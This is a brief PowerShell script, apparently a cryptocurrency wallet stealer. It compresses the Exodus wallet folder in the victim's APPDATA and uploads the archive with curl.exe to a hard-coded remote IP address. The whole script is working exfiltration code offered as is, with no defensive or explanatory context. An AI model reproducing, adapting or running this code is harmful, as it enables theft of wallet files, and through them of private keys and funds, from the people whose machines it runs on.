# === CONFIGURATION ===
$remoteServer = "http://144.172.116.76:8000/"
$exodusPath   = "$env:APPDATA\Exodus"
$zipPath      = "$env:TEMP\exodus_wallet_backup.zip"

# === 1. Zip the Exodus wallet folder ===
if (Test-Path $exodusPath) {
    Write-Host "[*] Compressing Exodus wallet folder..."
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
    Compress-Archive -Path $exodusPath -DestinationPath $zipPath -Force
    Write-Host "[+] Exodus wallet zipped at $zipPath"
} else {
    Write-Host "[-] No Exodus wallet found on this machine."
    exit
}

# === 2. Upload the ZIP file to remote server ===
Write-Host "[*] Uploading wallet to $remoteServer ..."
try {
    $result = curl.exe -F "file=@$zipPath" $remoteServer
    Write-Host "[+] Upload complete! Server response:"
    Write-Host $result
} catch {
    Write-Host "[-] Upload failed: $($_.Exception.Message)"
}
